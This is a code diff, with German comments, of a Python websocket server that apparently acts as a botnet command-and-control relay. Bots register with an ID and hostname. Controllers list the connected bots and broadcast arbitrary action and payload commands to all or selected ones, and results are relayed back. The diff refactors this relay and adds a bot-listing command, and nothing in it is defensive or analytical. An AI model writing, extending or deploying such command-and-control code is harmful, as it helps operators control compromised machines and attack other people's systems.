@@ -6,71 +6,92 @@ from colorama import init, Fore, Style
 
 init(autoreset=True)
 
-bots = {}  # Bots die mit VPS verbunden sind
-controllers = []  # Controller die verbunden sind
+bots = {}  # verbundene Bots
+controllers = []  # verbundene Controller
 
 
 async def broadcast_to_bots(msg):
-    """Leitet Befehl an Bots weiter"""
-    if not bots:
-        return False
-
     target = msg.get("target", "all")
     targets = list(bots.keys()) if target == "all" else [target] if target in bots else []
+
+    task_id = msg.get("task_id")
 
     for bot_id in targets:
         try:
             await bots[bot_id]["ws"].send(json.dumps({
                 "type": "command",
-                "task_id": msg.get("task_id"),
+                "task_id": task_id,
                 "data": {
                     "type": msg.get("action"),
                     "payload": msg.get("payload")
                 }
             }))
-            print(f"{Fore.CYAN}→ Weitergeleitet an Bot {bot_id}{Style.RESET_ALL}")
         except:
             pass
-    return len(targets) > 0
+    return len(targets)
 
 
 async def handler(websocket, path=None):
     try:
-        # Erste Nachricht prüfen ob Bot oder Controller
         first_msg = await websocket.recv()
         data = json.loads(first_msg)
 
-        if data.get("type") == "register" and "info" in data:  # Bot
+        # === Bot verbindet sich ===
+        if data.get("type") == "register":
             bot_id = data["bot_id"]
             hostname = data["info"].get("hostname", "Unknown")
-            bots[bot_id] = {"ws": websocket, "hostname": hostname, "last_seen": time.time()}
+            bots[bot_id] = {
+                "ws": websocket,
+                "hostname": hostname,
+                "last_seen": time.time(),
+                "info": data["info"]
+            }
             print(f"{Fore.GREEN}✅ Bot verbunden: {bot_id} | {hostname}{Style.RESET_ALL}")
 
             async for message in websocket:
                 msg = json.loads(message)
                 if msg["type"] == "result":
-                    # Ergebnis an alle Controller weiterleiten
                     for ctrl in controllers[:]:
                         try:
                             await ctrl.send(json.dumps(msg))
                         except:
-                            controllers.remove(ctrl)
+                            if ctrl in controllers:
+                                controllers.remove(ctrl)
 
-        elif data.get("type") == "controller":  # Controller
+        # === Controller verbindet sich ===
+        elif data.get("type") == "controller":
             controllers.append(websocket)
             print(f"{Fore.MAGENTA}🖥️ Controller verbunden{Style.RESET_ALL}")
 
             async for message in websocket:
                 msg = json.loads(message)
                 if msg["type"] == "command":
-                    await broadcast_to_bots(msg)
+                    action = msg.get("action")
+
+                    if action == "list":
+                        # Sofortige Antwort mit Bot-Liste
+                        bot_list = [
+                            {
+                                "bot_id": bid,
+                                "hostname": info["hostname"],
+                                "last_seen": int(time.time() - info["last_seen"])
+                            }
+                            for bid, info in bots.items()
+                        ]
+                        await websocket.send(json.dumps({
+                            "type": "result",
+                            "data": {"bots": bot_list, "count": len(bots)}
+                        }))
+                    else:
+                        # Normale Befehle an Bots weiterleiten
+                        await broadcast_to_bots(msg)
 
     except Exception as e:
-        print(f"Verbindung geschlossen: {e}")
+        print(f"Fehler: {e}")
     finally:
-        # Cleanup
         if websocket in controllers:
             controllers.remove(websocket)
+        # Bot Cleanup
         for bid, info in list(bots.items()):
             if info["ws"] == websocket:
                 print(f"{Fore.RED}❌ Bot getrennt: {bid}{Style.RESET_ALL}")
